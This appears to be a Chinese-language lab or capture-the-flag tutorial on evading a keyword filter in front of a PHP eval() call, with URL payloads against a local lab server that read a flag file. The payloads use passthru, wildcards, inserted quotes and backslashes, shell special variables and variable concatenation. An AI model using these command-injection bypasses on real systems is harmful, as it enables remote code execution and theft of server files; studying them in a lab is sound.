```php
if(!preg_match("/flag|system|php/i",$cmd)){
	eval($cmd);
}else{
	echo "不通过";
}
```

过滤了system 可以适用passthru等其它函数！
# **通配符? \*绕过**
flag.php改为fl?g.p?p

cat fl?g.p?p会flag.pbp ,flbg.pap等都属于fl?g.p?p的范畴但都不重要，重要的是flag.php属于这个范畴即可！
```http
http://192.168.245.128:18090/class05/1.php?cmd=passthru('cat fl?g.p?p');
```
![](./img/Pasted%20image%2020251025190922.png)
cat fl\*则会读取f开头的文件内容
```http
http://192.168.245.128:18090/class05/1.php?cmd=passthru('cat fl*');
```
![](./img/Pasted%20image%2020251025191051.png)
# **单双引号绕过**
```http
http://192.168.245.128:18090/class05/1.php?cmd=passthru("cat fla''g.p?p");
或
http://192.168.245.128:18090/class05/1.php?cmd=passthru('cat fla""g.p?p');
或
http://192.168.245.128:18090/class05/1.php?cmd=passthru('cat fla\'\'g.p?p');
```

# **反斜杠绕过\\**
```http
http://192.168.245.128:18090/class05/1.php?cmd=passthru("cat fla\g.p\hp");
php解析fla\g.p\hp当作fla\g.p\hp，也就是\也是字符
但到了linux服务器中\会被去掉变为flag.php
解析机制的不同造成此漏洞
```

# **特殊变量\$1至\$9,\$@\$* 
```http
cat fl$1ag.ph$2p
cat fl$*ag.ph$*p
http://192.168.245.128:18090/class05/1.php?cmd=passthru('cat fl$1ag.ph$2p');
```

# **内联执行**
```http
a=f;b=l;c=ag;d=p;e=h;echo $a$b$c.$d$e$d
http://192.168.245.128:18090/class05/1.php?cmd=passthru('a=f;b=l;c=ag;d=p;e=h;cat $a$b$c.$d$e$d');
```
